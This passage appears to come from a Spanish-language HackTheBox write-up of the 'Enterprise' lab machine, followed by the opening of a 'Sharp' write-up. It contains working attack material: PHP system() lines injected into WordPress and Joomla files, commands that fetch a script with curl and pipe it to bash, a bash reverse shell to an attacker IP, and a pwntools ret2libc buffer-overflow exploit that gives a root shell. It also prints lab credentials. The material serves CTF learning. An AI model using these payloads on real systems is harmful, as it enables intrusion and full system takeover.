:‚Äô) Bastante camino para llegar ac√° :) Ahora es muy simple es entablarnos una reverse Shell, simplemente debemos modificar algunos de los plugins que existan en el sitio, como ya jugamos con el plugin lcars, sabemos que existe. Vamos a Plugins &gt; Editor: Seleccionamos ahora el plugin lcars (donde esta la flecha üòú) y damos clic en Select: Perfecto, vemos los 3 archivos con los que ya jugamos y su contenido, solo que ahroa tenemos la posibilidad de editarlos, validemos que usuario esta ejecutando el servicio web, usare lcars. php: . . . // need to make it securesystem( whoami );?&gt;Clic en Update File, obtenemos File edited successfully. y vamos al archivo en la web: ‚ù≠ curl -s http://enterprise. htb/wp-content/plugins/lcars/lcars. phpwww-dataListo, confirmamos ejecucion remota de comandos, ahora creemonos un archivo que contenga lo que queremos que ejecute el sistema, asi se nos hace m√°s facil movernos entre comandos sin tener que modificar el plugin cada vez: ‚ù≠ cat rev. sh #!/bin/bashbash -i &gt;&amp; /dev/tcp/10. 10. 14. 17/4433 0&gt;&amp;1Levantamos un servidor web con Python: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Y nos ponemos en escucha con netcat en el puerto 4433: nc -lvp 4433. Finalmente editamos el plugin: . . . // need to make it secure// Leera el contenido del archivo rev. sh y con  | bash  lo interpretara. system( curl http://10. 10. 14. 17:8000/rev. sh | bash );?&gt;Simplemente hacemos una petici√≥n hacia el archivo y obtenemos nuestra reverse Shell: Hagamos tratamiento de la TTY para asi poder hacer CTRL+C sin miedo a perder la terminal, adem√°s de poder movernos entre comandos y tener historial :)  S4vitar explica en este video como obtener una Shell completamente interactiva (tratamiento TTY). Listooooos, a enumerar‚Ä¶ ‚Ä¶ Reverse Shell www-data WordPress: En el directorio /var/www/html tenemos los objetos de WordPress, validando el contenido del archivo wp-config. php (el que hace la conexi√≥n con la base de datos), obtenemos las credenciales del usuario root, pero de la base de datos, ya jugamos con la base de datos asi que no es interesante, pero las credenciales si lo son, guard√©moslas por si algo :) . . . /** MySQL database username */define('DB_USER', 'root');/** MySQL database password */define('DB_PASSWORD', 'NCC-1701E');. . . Dando vueltas nos encontramos este archivo en el direcotorio home/: www-data@b8319d86d21e:/home$ cat user. txt As you take a look around at your surroundings you realise there is something wrong. This is not the Enterprise!As you try to interact with a console it dawns on you. Your in the Holodeck!B√°sicamente que estamos en otro sitio y debemos movernos :( En la ra√≠z del sistema tenemos el archivo . dockerenv, el cual nos avisa que probablemente estemos en un contenedor (el hostname que tenemos tambi√©n nos da una pista sobre ello). Si vemos el objeto /etc/hosts lo confirmamos y nos damos cuenta de algo: www-data@b8319d86d21e:/$ cat /etc/hosts127. 0. 0. 1    localhost::1   localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172. 17. 0. 2   mysql 15af95635b7d172. 17. 0. 4   b8319d86d21eNosotros estamos en el host b8319d86d21e que resuelve a la IP 172. 17. 0. 4. Vemos tambi√©n el host del servicio MySQL, pero hay una brecha, ya que falta la 172. 17. 0. 3. En este momento record√© el servicio Joomla y que tenemos credenciales para probar‚Ä¶ ‚Ä¶ Joomla login done: Vamos al apartado administrator/: Y con las credenciales geordi. la. forge:ZD3YxfnSjezg67JZ logramos entrar al sitio como usuario Super Users: ‚Ä¶ Reverse Shell www-data Joomla: Listoneeeees, jugando con este recurso obtenemos ejecuci√≥n remota de comandos, simplemente debemos modificar un template (modificar√© el archivo index. php del template beez3) y dirigirnos a el para que el c√≥digo sea ejecutado‚Ä¶ Usamos el mismo payload de antes (curl a nuestro servidor) solo que ahora cambiamos el puerto por el cual obtendremos la Reverse Shell: . . . system( /usr/bin/curl http://10. 10. 14. 17:8000/rev. sh | bash );. . . Hacemos una peticion hacia la ruta: http://10. 10. 10. 61:8080/templates/beez3/index. php y obtenemos: Bien. Estamos en otro host, el a7018bfdc454. ‚Ä¶ Movimiento lateral : www-data (docker) -&gt; www-data (host) #: Despu√©s de hacer tratamiento de la TTY, encontramos esta maravilla: www-data@a7018bfdc454:/var/www/html$ ls -latotal 16988drwxr-xr-x 18 www-data www-data  4096 Sep 8 2017 . drwxr-xr-x 4 root   root    4096 Jul 24 2017 . . . . . drwxrwxrwx 2 root   root    4096 Oct 17 2017 files. . . www-data@a7018bfdc454:/var/www/html/files$ ls -latotal 12drwxrwxrwx 2 root   root   4096 Oct 17 2017 . drwxr-xr-x 18 www-data www-data 4096 Sep 8 2017 . . -rw-r--r-- 1 root   root   1406 Oct 17 2017 lcars. zipwww-data@a7018bfdc454:/var/www/html/files$Si recordamos, ya hab√≠amos visto este archivo en nuestra enumeraci√≥n con el puerto 443 de la m√°quina, asi que probablemente sea un recurso compartido, para validar creemos un archivo sencillito: www-data@a7018bfdc454:/var/www/html/files$ echo  hola  &gt; hola. txtwww-data@a7018bfdc454:/var/www/html/files$ ls -latotal 16drwxrwxrwx 2 root   root   4096 May 7 21:38 . drwxr-xr-x 18 www-data www-data 4096 Sep 8 2017 . . -rw-r--r-- 1 www-data www-data  5 May 7 21:38 hola. txt-rw-r--r-- 1 root   root   1406 Oct 17 2017 lcars. zipwww-data@a7018bfdc454:/var/www/html/files$Y en la web: ‚ù≠ curl -s -k https://10. 10. 10. 61/files/hola. txtholaPerrrrrrfecto, asi que podemos crearnos un archivo . php con contenido malicioso para que sea interpretado por la web :) Y ver a donde nos lleva‚Ä¶ www-data@a7018bfdc454:/var/www/html/files$ echo '&lt;?php system( whoami; hostname ); ?&gt;' &gt; hola. php‚ù≠ curl -s -k https://10. 10. 10. 61/files/hola. phpwww-dataenterprise. htbAl parecer ahora si estamos comunic√°ndonos con el host, entabl√©monos una nueva Reverse Shell :) www-data@a7018bfdc454:/var/www/html/files$ echo '&lt;?php system( curl http://10. 10. 14. 17:8000/rev. sh | bash ); ?&gt;' &gt; hola. phpCambiamos el puerto en el que vamos a estar escuchando: ‚ù≠ cat rev. sh #!/bin/bashbash -i &gt;&amp; /dev/tcp/10. 10. 14. 17/4435 0&gt;&amp;1Nos ponemos en escucha: nc -lvp 4435 y hacemos la petici√≥n hacia el recurso, obtenemos: Tratamiento de la TTY y a enumerar. ‚Ä¶ Escalada de privilegios #: Con www-data tenemos acceso a la flag user. txt sobre la ruta /home/jeanlucpicard. Viendo los servicios corriendo internamente tenemos: www-data@enterprise:/$ netstat -lActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address      Foreign Address     State tcp    0   0 0. 0. 0. 0:hostmon     0. 0. 0. 0:*        LISTEN tcp    0   0 0. 0. 0. 0:32812      0. 0. 0. 0:*        LISTEN tcp    0   0 0. 0. 0. 0:ssh       0. 0. 0. 0:*        LISTEN . . . Los dos puertos que vimos externamente, 22 y 32812. Pero tambi√©n uno llamado hostmon, que jugando con el archivo /proc/net/tcp (y con internet), vemos que es el puerto 5355. Dando vueltas con √©l no conseguimos nada, asi que recordamos el puerto 32812 que (no se vio, pero se hizo :P) externamente nos mostraba un programa interactivo, ve√°moslo pero internamente: www-data@enterprise:/$ nc 127. 0. 0. 1 32812         _______ _______ ______ _______     |   |    |_____| |_____/ |______     |_____ |_____ |   | |  \_ ______|Welcome to the Library Computer Access and Retrieval SystemEnter Bridge Access Code: holaInvalid CodeTerminating Consolewww-data@enterprise:/$(Desde nuestra m√°quina atacante podemos ejecutar nc 10. 10. 10. 61 32812 y vamos a obtener el mismo output) Vale, es un programa relacionado con el plugin que ya explotamos, lcars (Library Computer Access and Retrieval System), nos pide un c√≥digo de acceso‚Ä¶ Intentando con las contrase√±as que encontramos no logramos entrar :( Se me dio la idea de buscar algo relacionado con lcars en la m√°quina, y s√≠, encontramos cositas: www-data@enterprise:/$ find / -name lcars 2&gt;/dev/null/etc/xinetd. d/lcars/bin/lcarsUn binario llamativo, profundicemos en √©l: www-data@enterprise:/$ ls -la /bin/lcars -rwsr-xr-x 1 root root 12152 Sep 8 2017 /bin/lcarswww-data@enterprise:/$ file /bin/lcars /bin/lcars: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux. so. 2, for GNU/Linux 2. 6. 32, BuildID[sha1]=88410652745b0a94421ce22ea4278a8eaea8db57, not strippedwww-data@enterprise:/$ /bin/lcars         _______ _______ ______ _______     |   |    |_____| |_____/ |______     |_____ |_____ |   | |  \_ ______|Welcome to the Library Computer Access and Retrieval SystemEnter Bridge Access Code: holaInvalid CodeTerminating Consolewww-data@enterprise:/$ Tiene la misma ejecuci√≥n, por lo tanto podemos pensar que el binario est√° siendo servido en el puerto 32812, bien, juguemos con √©l‚Ä¶ Con strace y ltrace, podemos ver los llamados que hace una aplicaci√≥n hacia el sistema, nos damos cuenta de algo: www-data@enterprise:/$ ltrace /bin/lcars __libc_start_main(0x56555c91, 1, 0xffffdd04, 0x56555d30 &lt;unfinished . . . &gt;setresuid(0, 0, 0, 0x56555ca8)                                             = 0xffffffffputs(  )                                                        = 1puts(          _______ _______ . . .         _______ _______ ______ _______)                                      = 49puts(      |   |    |_____| . . .      |   |    |_____| |_____/ |______)                                      = 49puts(      |_____ |_____ |   | . . .      |_____ |_____ |   | |  \_ ______|)                                      = 49puts(  )                                                        = 1puts( Welcome to the Library Computer  . . . Welcome to the Library Computer Access and Retrieval System)                                      = 61puts( Enter Bridge Access Code:  Enter Bridge Access Code: )                                           = 27fflush(0xf7fc7d60)                                                   = 0fgets(Ah√≠ espera por nuestro input, coloquemos hola: fgets(hola hola\n , 9, 0xf7fc75a0)                                             = 0xffffdc47strcmp( hola\n ,  picarda1 )                                              = -1puts( \nInvalid Code\nTerminating Consol . . . Invalid CodeTerminating Console)                                     = 35fflush(0xf7fc7d60)                                                   = 0exit(0 &lt;no return . . . &gt;+++ exited (status 0) +++www-data@enterprise:/$Opa, vemos la funci√≥n strcmp (que compara dos valores, si son iguales continua el flujo del programa), toma hola y lo compara con el valor picarda1, como no son iguales obtenemos el error Invalid Code - Terminating Console. Asi que probemos ejecutar el programa pero pas√°ndole como c√≥digo picarda1: www-data@enterprise:/$ /bin/lcars         _______ _______ ______ _______     |   |    |_____| |_____/ |______     |_____ |_____ |   | |  \_ ______|Welcome to the Library Computer Access and Retrieval SystemEnter Bridge Access Code: picarda1         _______ _______ ______ _______     |   |    |_____| |_____/ |______     |_____ |_____ |   | |  \_ ______|Welcome to the Library Computer Access and Retrieval SystemLCARS Bridge Secondary Controls -- Main Menu: 1. Navigation2. Ships Log3. Science4. Security5. StellaCartography6. Engineering7. ExitWaiting for input: Perfecto, entramos, ahora nos encontramos un men√∫, jugando sin explotar nada, no vemos nada e. e Si generamos una cadena de 300 caracteres y se la pasamos a cada opci√≥n, obtenemos un Segmentation Fault en 4. Security: ‚ù≠ cyclic 300aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac. . . LCARS Bridge Secondary Controls -- Main Menu: 1. Navigation2. Ships Log3. Science4. Security5. StellaCartography6. Engineering7. ExitWaiting for input: 4Disable Security Force FieldsEnter Security Override:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaacSegmentation fault (core dumped)www-data@enterprise:/$ Ooo, asi que probablemente debamos explotar este buffer overflow para ejecutar alg√∫n tipo de Shell code ante la m√°quina, ya profundizaremos en esto‚Ä¶ Pasemos el binario a nuestro sistema atacante, asi es m√°s f√°cil jugar.  Explicaci√≥n sobre que es un buffer overflow. www-data@enterprise:/bin$ python3 -m http. server 44444Serving HTTP on 0. 0. 0. 0 port 44444 . . . ‚ù≠ wget http://10. 10. 10. 61:44444/lcars--2021-05-07 22:29:05-- http://10. 10. 10. 61:44444/lcarsConectando con 10. 10. 10. 61:44444. . . conectado. . . . Validamos integridad del binario: www-data@enterprise:/bin$ md5sum lcars cf72dd251d6fee25e638e9b8be1f8dd3 lcars‚ù≠ md5sum lcarscf72dd251d6fee25e638e9b8be1f8dd3 lcarsListo, todo correcto, a divertirnos (: ‚Ä¶ Buffer Overflow: Nos copiaremos la estructura de un programa que le vi a dplastico para jugar con gdb, con el recurso remoto y tambi√©n para movernos localmente. Inicialmente le enviaremos todos los datos que recibe el programa: #!/usr/bin/python3import sysfrom pwn import *elf = context. binary = ELF(sys. argv[1])context. terminal = ['tmux', 'splitw', '-h']def start():  if args. GDB:    return gdb. debug(sys. argv[1])  if args. REMOTE:    return remote('10. 10. 10. 61', 32182)  else:    return process(sys. argv[1])r = start()# ======================= Aca ta la magia ========================r. sendlineafter( Enter Bridge Access Code: ,  picarda1 )r. sendlineafter( Waiting for input: ,  4 )print(r. recv())# ===================== Aca termina la magia ====================r. interactive()Ejecutamos: ‚ù≠ python3 exploit. py . /lcars[*] '/htb/enterprise/scripts/lcars'  Arch:   i386-32-little  RELRO:  Partial RELRO  Stack:  No canary found  NX:    NX disabled  PIE:   PIE enabled  RWX:   Has RWX segments[+] Starting local process '. /lcars': pid 898435b' \n'[*] Switching to interactive modeDisable Security Force FieldsEnter Security Override:$Bien, el programa esta esperando el input donde encontramos el Segmentation Fault, por lo tanto sera donde enviaremos nuestro payload: #!/usr/bin/python3import sysfrom pwn import *elf = context. binary = ELF(sys. argv[1])context. terminal = ['tmux', 'splitw', '-h']def start():  if args. GDB:    return gdb. debug(sys. argv[1])  if args. REMOTE:    return remote('10. 10. 10. 61', 32812)  else:    return process(sys. argv[1])r = start()# ======================= Aca ta la magia ========================payload =  aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac r. sendlineafter( Enter Bridge Access Code: ,  picarda1 )r. sendlineafter( Waiting for input: ,  4 )r. sendlineafter( Enter Security Override: , payload)# ===================== Aca termina la magia ====================r. interactive() Writing exploits with pwntools. (Ya hablaremos de las protecciones del binario) Ejecutemos pero veamos el debug con gdb de una vez: ‚ù≠ python3 exploit. py . /lcars GDB[*] '/sec/htb/enterprise/scripts/lcars'  Arch:   i386-32-little  RELRO:  Partial RELRO  Stack:  No canary found  NX:    NX disabled  PIE:   PIE enabled  RWX:   Has RWX segments[+] Starting local process '/usr/bin/gdbserver': pid 907075[*] running in new terminal: /usr/bin/gdb -q  . /lcars  -x /tmp/pwn4qa4544z. gdbY con tmux se nos abre otro panel en la misma ventana ejecutando gdb, escribimos continue (o c) y obtenemos: Nos enfocaremos en el apartado REGISTERS y en uno de ellos por ahora:  Registro eip, encargado de mostrar la siguiente direcci√≥n a la que ira el programa.  Informaci√≥n sobre los registros En nuestro caso 4 registros est√°n siendo sobreescritos por parte de nuestro payload, la idea es extraer exactamente la posici√≥n del paylaod que contiene el registro eip, ya que si es el registro que indica a donde ir, teniendo control sobre √©l, podr√≠amos poner cualquier direcci√≥n a la cual queramos que vaya, esto lo podemos hacer con el mismo cyclic: . . . # *EIP 0x63616164 ('daac'). . . pwndbg&gt; cyclic -l daac212En la posici√≥n 212 encuentra los caracteres daac, pues generemos 212 A‚Äôs 4 B‚Äôs y 4 C‚Äôs para mostrar mejor esto y envi√©moslas ;) . . . payload =  A *212¬∑                                                                                     payload +=  B *4 +  C *4. . . . . . *EAX 0xfe*EBX 0x41414141 ('AAAA') ECX 0x0 EDX 0x0*EDI 0xf7f20000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî insb  byte ptr es:[edi], dx /* 0x1e4d6c */*ESI 0xf7f20000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî insb  byte ptr es:[edi], dx /* 0x1e4d6c */*EBP 0x41414141 ('AAAA')*ESP 0xffdffc70 ‚óÇ‚Äî 'CCCC'*EIP 0x42424242 ('BBBB'). . . Bien, tenemos que el registro que apunta a la base de la pila (ebp, ‚Äúeste registro mantiene la direcci√≥n del origen de la pila‚Äù), contiene hasta la posici√≥n 212, despues empezar√≠a el registro eip (que es el que nos interesa), conteniendo las B‚Äôs, por lo tanto en esa posici√≥n debe ir la direcci√≥n a la que queremos ir‚Ä¶ Y las C estar√≠an haciendo parte del stack, que es donde ir√≠a nuestro shellcode. ‚Ä¶ Tambi√©n podemos entenderlo asi: (Enviamos 200 C‚Äôs y en gdb le indicamos que nos muestre 80 direcciones, pero que empiece a contar 50 antes de llegar al esp (esto para poder ver el contenido del ebp y el eip))  Buffer overflow y Shellcode. :P ‚Ä¶ Ech√©mosle un ojo a las protecciones que tiene el binario:  SPAM: Ac√° tengo otro writeup de un reto en especifico sobre Buffer Overflow. ‚ù≠ checksec lcars[*] '/htb/enterprise/scripts/lcars'  Arch:   i386-32-little  RELRO:  Partial RELRO  Stack:  No canary found  NX:    NX disabled  PIE:   PIE enabled  RWX:   Has RWX segments RELRO: Al estar en Partial nos permite sobreescribir direcciones del global offset table.  Stack: Nos despreocupamos (ya que est√° desactivada :P) de una direcci√≥n que se crea antes de llegar al final del Stack, ya que puede darnos problemas.  NX: El Stack es ejecutable, por lo tanto podr√≠amos enviar shellcodes y c√≥digo malicioso para ejecutarlo en el binario.  PIE: Pero tenemos de manera randomizada la Virtual Address Place del binario. Bien, ahora lo que nos queda es jugar con la direcci√≥n del registro eip y ver como podemos ejecutar comandos jugando con el stack y las direcciones locas‚Ä¶ En este caso no podemos hacer el t√≠pico ataque BOF (de los CTF‚Äôs) de movernos a una funci√≥n llamada **vuln o llamada flag para que nos muestre lo que queremos, nop, en este caso debemos buscar un poco m√°s para ver como ejecutar comandos ya sea con expresiones externas o con el mismo programa‚Ä¶** Leyendo un poco encontr√© un ataque llamado Ret2libc que se basa en ejecutar c√≥digo que ya existe en la memoria, mejor dicho, funciones del propio programa :)  Pa leer: Mi primer buffer overflow. Para ejecutar esto, debemos buscar si existe alguna funci√≥n importante en memoria, encontramos este recurso que nos explica detalladamente lo peligrosas que pueden ser las funciones del propio programa/librer√≠a:  Binary Exploitation Data-Execution-Prevention. Nos indican que debemos buscar la funci√≥n system(), que ejecuta comandos en el sistema: pwndbg&gt; print system$1 = {int (const char *)} 0xf7d7ffa0 &lt;__libc_system&gt;Bien, tenemos una direcci√≥n en memoria de la funci√≥n system(). Ahora debemos encontrar alguna referencia hacia ‚Äú/bin/bash‚Äù o ‚Äú/bin/sh‚Äù, para asi obtener una Shell cuando ejecutemos nuestro exploit: pwndbg&gt; find  /bin/bash Argument required (expression to compute). Siguiendo esta descripci√≥n de find, debemos pasarle dos argumentos m√°s para que haga la b√∫squeda de memoria correctamente:  find [/sn] start_addr, +len, val1 [, val2, ‚Ä¶] Entonces podemos indicarle que la direcci√≥n de inicio sea la que encontramos (system) (asi solo no sirve, debemos agregarle +len) y le pasamos que el tama√±o sea de 8 bytes: pwndbg&gt; find 0xf7d7ffa0,+12345678, /bin/bash warning: Unable to access 16000 bytes of target memory at 0xf7f21f29, halting search. Pattern not found. Parece que ya est√° funcionando, busquemos /bin/sh: pwndbg&gt; find 0xf7d7ffa0,+12345678, /bin/sh 0xf7ec733cwarning: Unable to access 16000 bytes of target memory at 0xf7f210c4, halting search. 1 pattern found. Perfecto, encontramos una direcci√≥n en memoria donde se hace referencia a /bin/sh, tambi√©n nos la guardamos :) Vemos que tenemos y vamos organizando el script:  Direcci√≥n funci√≥n system(), que nos servir√° para ejecutar la Shell (/bin/sh): 0xf7d7ffa0.  Direcci√≥n llamado /bin/sh: 0xf7ec733c. Para que las direcciones no sean din√°micas, debemos validar el ASLR que est√© desactivado: (Esto en mi m√°quina, pero tambi√©n debemos validarlo en el sistema vulnerable. ) ‚ù≠ cat /proc/sys/kernel/randomize_va_space0Si est√° en 2 est√° activado y deber√≠amos pasarlo a 0 (o bypassearlo), pero por ahora tamos bien, validemos ahora el de enterprise. htb: www-data@enterprise:/var/www/html/files$ cat /proc/sys/kernel/randomize_va_space0Listo, sin problemas. ‚Ä¶ Entonces nuestro script tendr√≠a estas nuevas l√≠neas: . . . payload = ( A *212). encode() # Pasamos la cadena a bytes para poder concatenarlapayload += p32(0xf7d7ffa0, endian='little') # system()payload += p32(0xf7ec733c, endian='little') # /bin/sh. . . Ahora podemos empezar a probar sin tener de intermediario a gdb: ‚ù≠ python3 exploit. py . /lcars[*] '/htb/enterprise/scripts/lcars'  Arch:   i386-32-little  RELRO:  Partial RELRO  Stack:  No canary found  NX:    NX disabled  PIE:   PIE enabled  RWX:   Has RWX segments[+] Starting local process '. /lcars': pid 1125113[*] Switching to interactive modesh: 1: \x13 not found[*] Got EOF while reading in interactive$ id[*] Process '. /lcars' stopped with exit code -11 (SIGSEGV) (pid 1125113)[*] Got EOF while sending in interactiveTenemos un error: sh: 1: \x13 not found‚Ä¶ Buscando m√°s ejemplos sobre el ataque encontramos este recurso:  Linux Classic - return2libc. pdf. Donde ejecuta pr√°cticamente los mismos pasos, busca la direcci√≥n en memoria de la funci√≥n system() y algo relacionado con ‚Äú/bin/sh‚Äù, peeeero entre medio de los dos pasa 4 bytes (8 bits) basura, algo asi como: . . . payload = ( A *212). encode() # Pasamos la cadena a bytes para poder concatenarlapayload += p32(0xf7d7ffa0, endian='little') # system()payload = ( B *4). encode() # + Basurita en bytespayload += p32(0xf7ec733c, endian='little') # /bin/sh. . . Entonces (leyendo art√≠culos):  ‚ÄúSo our next 4 bytes will be either a valid return adress (perhaps another C library function ^^?), or some random garbage‚Äù, tomado de Exploiting Techniques - ret2libc. Como bien dice ah√≠, los siguientes 4 bytes despues de la funci√≥n system() podr√≠an ser o basura o alguna otra funci√≥n del programa, pero debe ir algo (: Listo, ejecutemos: ‚ù≠ python3 exploit. py . /lcars[*] '/htb/enterprise/scripts/lcars'  Arch:   i386-32-little  RELRO:  Partial RELRO  Stack:  No canary found  NX:    NX disabled  PIE:   PIE enabled  RWX:   Has RWX segments[+] Starting local process '. /lcars': pid 1163091[*] Switching to interactive mode$ whoamiroot$ hostname -I10. 10. 14. 17$ Bieeeeeeeeeeeeeeeen, tenemos una /bin/sh, en este caso en nuestra m√°quina, pero ya podr√≠amos indicarle el argumento REMOTE, para que tome la direcci√≥n IP y el puerto de la m√°quina v√≠ctima: ‚ù≠ python3 exploit. py . /lcars REMOTE[*] '/htb/enterprise/scripts/lcars'  Arch:   i386-32-little  RELRO:  Partial RELRO  Stack:  No canary found  NX:    NX disabled  PIE:   PIE enabled  RWX:   Has RWX segments[+] Opening connection to 10. 10. 10. 61 on port 32812: Done[*] Switching to interactive mode[*] Got EOF while reading in interactive$ id$ [*] Closed connection to 10. 10. 10. 61 port 32812[*] Got EOF while sending in interactive Jmmm, dando unas vueltas cai en cuenta que el programa est√° tomando nuestras direcciones en memoria, o sea con las que interact√∫a el programa en nuestro sistema, tiene sentido que no sirva, ya que esas direcciones probablemente no sean las mismas que usa el programa en la m√°quina v√≠ctima‚Ä¶ Juguemos con ella (ya que tiene gdb) para extraer las direcciones en memoria y validar si ese es el error: www-data@enterprise:/bin$ gdb . /lcars -qReading symbols from . /lcars. . . (no debugging symbols found). . . done. (gdb)Para obtener todos los valores necesitamos que el programa se ejecute y tenga un breakpoint (este para obtener ‚Äú/bin/sh‚Äù), asi que hacemos todo el recorrido (c√≥digo &gt; 4 &gt; cadena en el apartado seguridad) y ah√≠ si jugamos: . . . (gdb) p system$1 = {&lt;text variable, no debug info&gt;} 0xf7e4c060 &lt;system&gt;(gdb) find 0xf7e4c060,+87654321, /bin/sh warning: Unable to access 16000 bytes of target memory at 0xf7f55a67, halting search. Pattern not found. (gdb) b mainBreakpoint 1 at 0x56555ca0(gdb) rStarting program: /bin/lcars Breakpoint 1, 0x56555ca0 in main ()(gdb) find 0xf7e4c060,+87654321, /bin/sh 0xf7f70a0fwarning: Unable to access 16000 bytes of target memory at 0xf7fca797, halting search. 1 pattern found. (gdb) Bien, ya tenemos los 2 valores:  system(): 0xf7e4c060.  /bin/sh: 0xf7f70a0f. Agregu√©moslos al script y ejecutemos :O . . . payload = ( A *212). encode() # Pasamos la cadena a bytes para poder concatenarlapayload += p32(0xf7e4c060, endian='little') # Systempayload += ( B *4). encode() # + basuritapayload += p32(0xf7f70a0f, endian='little') # /bin/sh. . . ‚ù≠ python3 exploit. py . /lcars REMOTE[*] '/htb/enterprise/scripts/lcars'  Arch:   i386-32-little  RELRO:  Partial RELRO  Stack:  No canary found  NX:    NX disabled  PIE:   PIE enabled  RWX:   Has RWX segments[+] Opening connection to 10. 10. 10. 61 on port 32812: Done[*] Switching to interactive mode[*] Got EOF while reading in interactive$ id$ [*] Closed connection to 10. 10. 10. 61 port 32812[*] Got EOF while sending in interactivePero tampoco‚Ä¶ Gui√°ndome por algunos post, algunos simplemente buscaban la cadena ‚Äúsh‚Äù (haciendo referencia a la /bin/sh), intentemos buscar esa cadena: (gdb) find 0xf7e4c060,+87654321, sh 0xf7f6ddd50xf7f6e7e10xf7f70a140xf7f72582warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search. 4 patterns found. Hay 4 coincidencias en memoria, tomemos la primera y remplac√©mosla por la direcci√≥n /bin/sh que ten√≠amos: ‚ù≠ python3 exploit. py . /lcars REMOTE[*] '/htb/enterprise/scripts/lcars'  Arch:   i386-32-little  RELRO:  Partial RELRO  Stack:  No canary found  NX:    NX disabled  PIE:   PIE enabled  RWX:   Has RWX segments[+] Opening connection to 10. 10. 10. 61 on port 32812: Done[*] Switching to interactive mode$ iduid=0(root) gid=0(root) groups=0(root)$ hostname -I10. 10. 10. 61 172. 17. 0. 1 dead:beef::250:56ff:feb9:7ba $ hostnameenterprise. htb$  PERF3ct0000000000oooOOOOOOOOoooooooVoooo‚Ä¶‚Ä¶‚Ä¶‚Ä¶. Tenemos una sh en la m√°quina v√≠ctima aprovech√°ndonos de un buffer overflow con el ataque ret2libc (: que belleza eh! (Probando con las 4 direcciones que encontramos relacionadas con sh, la √∫nica que da problemas es 0xf7f70a14, de resto tambi√©n obtenemos una Shell üòä)  exploitBOF. py Solo nos quedar√≠a ver las flags: ‚Ä¶ Creamos un script para elegir en que sistema queremos ejecutar comandos remotamente, ya sea en el contenedor que tiene WordPress, el que tiene Joomla o contra el propio host:  RCE_word_joom_host. py ‚Ä¶ Ufff, que locura no? Me disculpo si escrib√≠ mucho, pero como digo siempre, prefiero hacerlo asi para que sea m√°s did√°ctico y se puedan ver errores y explicaciones extras (que nunca vienen mal). Me gusto mucho la m√°quina en general, algo raro el tema del SQL (que me funciono con mi sentencia normal, pero despues se pudri√≥ todo y toco concatenarle cositas), pero se aprende a jugar con sentencias. La parte del BOF estuvo brutal, es la primera m√°quina en la que tengo que jugar con algo asi, ya que en Buff deb√≠amos explotar un exploit conocido relacionado con Buffer overflow, pero no deb√≠amos hacerlo tan manual, asi que estuvo incre√≠ble. Y bueno, como siempre y como nunca, a seguir rompiendo todo!! Bless "
    }, {
    "id": 52,
    "url": "http://localhost:4000/htb/sharp",
    "title": "HackTheBox - Sharp",
    "body": "2021/05/01 - M√°quina Windows nivel dif√≠cil, vamos a movernos entre carpetas compartidas, organizaremos nuestras ideas con Kanban (ü§™) y jugaremos con binarios . exe para aprovechar deserializaciones y errores de configuraci√≥n.  TL;DR (Spanish writeup): Creada por: cube0x0. ADARLEEEEEEMECHAAAA! De primeras jugando con el servicio SMB encontraremos la carpeta compartida kanban/ algo sospechosa, entre sus archivos estar√° PortableKanban. pk3 el cual dentro contiene encriptadas las contrase√±as de unos usuarios, usaremos un exploit para descifrarlas. Obtendremos la contrase√±a real de un usuario llamado lars, nos servir√° para autenticarnos al servicio SMB, pero en este caso tendremos la carpeta dev/, dentro tiene 2 binarios que jugando con dnSpy logramos decompilar, esto y bastante research nos servir√° para darnos cuenta de que estamos ante una deserializacion, usaremos ysoserial para generar payloads y aprovecharnos de la vulnerabilidad y as√≠ obtener una PowerShell como el usuario lars. En el directorio c:\Users\lars\Documents\wcf tenemos unos archivos extra√±os que hacen alusi√≥n al modelo WCF (Windows Communication Foundation), jugaremos con SMB para transfer√≠rnoslos a nuestra m√°quina, nos daremos cuenta de que el propietario y el que ejecuta el servicio implicado es el usuario Administrator. Tendremos que modificar el contenido (aprovecharemos a Visual Studio para compilar los binarios) para que nos entable una Reverse Shell, finalmente subiremos los archivos compilados y obtendremos la dichosa Shell como el usuario Administrator en el sistema (: Clasificaci√≥n de la m√°quina: Un poco de enumeraci√≥n, le gusta la realidad ;)  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ Tendremos como siempre 3 fases:  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Empezaremos realizando un escaneo de puertos sobre la m√°quina para saber que servicios se est√°n ejecutando: ‚Äì¬ª nmap -p- --open -v -Pn 10. 10. 10. 219 -oG initScan      Par√°metro   